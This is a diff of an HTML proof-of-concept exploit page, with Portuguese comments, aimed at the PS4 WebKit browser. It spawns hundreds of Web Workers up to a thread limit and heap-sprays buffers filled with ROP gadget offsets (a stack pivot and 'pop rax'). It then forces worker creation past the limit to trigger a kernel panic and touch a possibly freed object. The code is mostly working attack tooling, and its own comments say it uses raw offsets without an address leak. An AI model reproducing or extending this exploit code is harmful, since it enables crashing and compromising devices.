@@ -2,98 +2,187 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Limit Sniper (Target: 420)</title>
+<title>PS4 ROP PoC (Teste 09)</title>
 <style>
-    body { background: #000; color: #fff; font-family: monospace; padding: 20px; }
-    button { padding: 15px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
-    .btn-prep { background: #2980b9; border: 1px solid #fff; color: #fff; }
-    .btn-fire { background: #c0392b; border: 1px solid #f00; color: #fff; }
-    #log { border: 1px solid #444; height: 300px; overflow-y: scroll; padding: 10px; color: #0f0; }
+    body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+    h1 { color: #ff3333; text-shadow: 0 0 5px #f00; }
+    .panel { border: 2px solid #333; padding: 15px; margin-bottom: 20px; background: #1a1a1a; }
+    button { width: 100%; padding: 15px; margin: 5px 0; font-size: 16px; font-weight: bold; cursor: pointer; border: 1px solid #0f0; background: #000; color: #0f0; transition: 0.2s; }
+    button:hover { background: #0f0; color: #000; }
+    button.danger { border-color: #f00; color: #f00; }
+    button.danger:hover { background: #f00; color: #fff; }
+    #log { height: 300px; overflow-y: scroll; border: 1px dashed #555; padding: 10px; font-size: 12px; background: #000; white-space: pre-wrap; }
+    .highlight { color: #ffff00; font-weight: bold; }
 </style>
 </head>
 <body>
 
-<h1>TARGET LIMIT: 420</h1>
-<p>Estratégia: Encher até 415 -> Spray de Memória -> Trigger no 420</p>
+<h1>TESTE 09: ROP CHAIN INJECTION</h1>
+<p>Target: WebKit Thread Limit (419) + Stack Pivot Gadget</p>
 
-<button class="btn-prep" onclick="phase1_FillSafe()">FASE 1: Encher até 415 (Seguro)</button>
-<button class="btn-fire" onclick="phase2_Trigger()">FASE 2: Spray + Crash (Trigger)</button>
+<div class="panel">
+    <h3>Status do Sistema</h3>
+    <div id="status">Aguardando início...</div>
+</div>
 
-<div id="log">Sistema pronto.</div>
+<div class="panel">
+    <button onclick="step1_Prepare()">PASSO 1: Preparar Heap & Workers (Safe Zone)</button>
+    <button class="danger" onclick="step2_Exploit()">PASSO 2: INJETAR ROP & DISPARAR (Panic)</button>
+</div>
+
+<div id="log">Logs de execução aparecerão aqui...</div>
 
 <script>
-    let workers = [];
-    // Payload do worker: mantém-se vivo
-    const blobUrl = URL.createObjectURL(new Blob([`onmessage=()=>{}`], {type: 'application/javascript'}));
+    // --- CONFIGURAÇÃO ROP (Baseada no ps4_rop_analysis.json) ---
+    // Como não temos um vazamento de endereço (Info Leak) para saber a base do WebKit,
+    // usaremos os Offsets brutos. Se o crash mudar de "414141" para "46ca0", 
+    // provamos que controlamos o ponteiro de instrução (RIP).
+    
+    // Gadget: pop rsp; ret (Encontrado no libSceNKWebKit.sprx.elf)
+    // Offset: 0x46ca0
+    const GADGET_STACK_PIVOT = 0x46ca0; 
+    
+    // Gadget: pop rax; ret
+    // Offset: 0x26f53
+    const GADGET_POP_RAX = 0x26f53;
 
-    function log(msg) {
-        const l = document.getElementById('log');
-        l.innerText += "\n> " + msg;
-        l.scrollTop = l.scrollHeight;
+    // Marcador visual para debug (caso tenhamos dump)
+    const MARKER_1337 = 0x13371337;
+
+    // Variáveis Globais
+    let workers = [];
+    let sprayData = [];
+    const LIMIT_SAFE = 415; // Zona segura antes do crash (confirmado no Teste 08)
+    const LIMIT_CRASH = 425; // Passa do 419 para garantir o erro
+
+    const workerBlob = URL.createObjectURL(new Blob([`
+        onmessage = function(e) {
+            // Mantém a thread viva e ocupada
+            if(e.data === 'ping') postMessage('pong');
+        }
+    `], {type: 'application/javascript'}));
+
+    function log(msg, type = 'info') {
+        const el = document.getElementById('log');
+        const time = new Date().toLocaleTimeString();
+        const line = `[${time}] ${msg}\n`;
+        
+        if (type === 'warn') el.innerHTML += `<span class="highlight">${line}</span>`;
+        else el.innerText += line;
+        
+        el.scrollTop = el.scrollHeight;
     }
 
-    // FASE 1: Chegar perto do limite sem cair
-    function phase1_FillSafe() {
-        log("A criar 415 workers...");
+    // --- FUNÇÃO DE SPRAY INTELIGENTE ---
+    // Cria estruturas falsas na memória contendo nossa ROP Chain
+    function prepareRopSpray() {
+        log("Construindo payload ROP...", 'warn');
+        
+        // Tamanho de alocação comum para objetos do WebKit (tentativa de Feng Shui)
+        const SPRAY_SIZE = 1024 * 32; 
+        
+        try {
+            for(let i = 0; i < 500; i++) {
+                // Uint32Array permite escrever inteiros de 32 bits diretamente
+                let struct = new Uint32Array(SPRAY_SIZE / 4);
+                
+                // Preenche o buffer repetidamente com nosso "Fake Vtable Pointer"
+                // Queremos que, onde quer que o Kernel leia, ele encontre nosso gadget.
+                for(let j = 0; j < struct.length; j += 2) {
+                    // Simula um endereço de 64 bits: 0x0000000000046ca0
+                    // Em um exploit real, somaríamos a Base Address aqui.
+                    struct[j] = GADGET_STACK_PIVOT;   // Low 32 bits
+                    struct[j+1] = 0x00000000;         // High 32 bits
+                }
+
+                // Injeta um pouco de "tempero" no meio para identificação
+                // Se controlarmos a stack, o próximo 'ret' vai puxar isso.
+                if(struct.length > 20) {
+                    struct[10] = GADGET_POP_RAX;      // Próximo passo da ROP
+                    struct[11] = 0x00000000;
+                    struct[12] = MARKER_1337;         // Valor para carregar em RAX
+                    struct[13] = 0x00000000;
+                }
+
+                sprayData.push(struct);
+            }
+            log(`Spray concluído: ${sprayData.length} blocos injetados na Heap.`);
+        } catch(e) {
+            log("Erro no Spray: " + e.message);
+        }
+    }
+
+    // --- PASSO 1: PREPARAÇÃO ---
+    function step1_Prepare() {
+        log("Iniciando Fase 1: Encher piscina de threads...");
         let count = 0;
-        const i = setInterval(() => {
-            if(count >= 415) {
-                clearInterval(i);
-                log("FASE 1 CONCLUÍDA: 415 Threads ativas.");
-                log("Aguarde 5 segundos para estabilização antes da FASE 2.");
+
+        const interval = setInterval(() => {
+            if(count >= LIMIT_SAFE) {
+                clearInterval(interval);
+                log(`Fase 1 Completa: ${count} Workers ativos.`);
+                log("Sistema instável. Prepare-se para o Passo 2.");
+                document.getElementById('status').innerText = "PRONTO PARA ATAQUE";
+                document.getElementById('status').style.color = "red";
+                
+                // Executa o Spray agora para garantir que a memória esteja "suja"
+                // antes da última alocação crítica
+                prepareRopSpray();
                 return;
             }
+
             try {
-                workers.push(new Worker(blobUrl));
+                const w = new Worker(workerBlob);
+                workers.push(w);
                 count++;
-                if(count % 50 === 0) log(`Progresso: ${count}...`);
+                if(count % 50 === 0) log(`Workers: ${count}/${LIMIT_SAFE}`);
             } catch(e) {
-                log("Erro inesperado na fase segura: " + e.message);
-                clearInterval(i);
+                log("Erro prematuro na Fase 1: " + e.message);
+                clearInterval(interval);
             }
-        }, 5); // Criação rápida mas controlada
+        }, 5);
     }
 
-    // Função de Spray (Encher memória com AAAA)
-    function heapSpray() {
-        log("A injetar padrão 0x41414141 na Heap...");
-        const spray = [];
-        try {
-            for(let i=0; i < 500; i++) {
-                // Cria Arrays Uint32 preenchidos com 0x41414141
-                let buffer = new Uint32Array(1024 * 8); // 32KB
-                buffer.fill(0x41414141);
-                spray.push(buffer);
-            }
-        } catch(e) {}
-        return spray;
-    }
+    // --- PASSO 2: GATILHO (TRIGGER) ---
+    function step2_Exploit() {
+        log("INICIANDO FASE 2: QUEBRA DE LIMITE (419 -> 420)", 'warn');
+        log("Se funcionar, o console deve travar ou desligar imediatamente.");
+        
+        // Reforça o spray logo antes do crash
+        log("Reforçando Heap Spray...");
+        prepareRopSpray(); 
 
-    // FASE 2: O Passo Final
-    function phase2_Trigger() {
-        // 1. Sujar a memória
-        const junk = heapSpray(); 
+        let count = LIMIT_SAFE;
         
-        log("Memória preparada. A iniciar rutura de limite...");
-        
-        // 2. Tentar passar de 415 para 430 (Vai bater no 420 e crashar)
-        let count = 415;
-        const i = setInterval(() => {
+        // Vamos tentar alocar lentamente para pegar o momento exato
+        const interval = setInterval(() => {
             try {
-                workers.push(new Worker(blobUrl));
+                // Tenta criar workers além do limite
+                const w = new Worker(workerBlob);
+                workers.push(w);
                 count++;
-                log(`WORKER Nº ${count} CRIADO`);
+                log(`Criando Worker #${count} (Crítico)...`);
                 
-                // Reforçar o spray a cada passo
-                if(count >= 418) heapSpray();
-
+                // Se passar de 425 sem crashar, algo deu errado
+                if(count > LIMIT_CRASH) {
+                    clearInterval(interval);
+                    log("Falha: Limite ultrapassado sem Panic. O Bug não disparou.");
+                }
             } catch(e) {
-                log(`ERRO CAPTURADO NO ${count}: ${e.message}`);
-                log("Se o console não desligou, o bug foi mitigado.");
+                log(`Exceção capturada no #${count}: ${e.message}`);
+                log("Tentando forçar acesso ao objeto inválido...");
+                
+                // Se a criação falhou, o objeto interno pode estar num estado "zumbi" (NULL ou Free)
+                // Vamos tentar interagir com o último worker criado com sucesso
+                if(workers.length > 0) {
+                    const lastWorker = workers[workers.length - 1];
+                    lastWorker.postMessage('ping'); // Tenta disparar o uso do ponteiro
+                    lastWorker.terminate();         // Tenta disparar o destrutor bugado
+                }
             }
-        }, 100); // Lento para garantir que o spray está lá quando o crash ocorrer
+        }, 100); // 100ms entre tentativas para dar tempo do kernel processar e crashar
     }
-</script>
 
+</script>
 </body>
 </html>
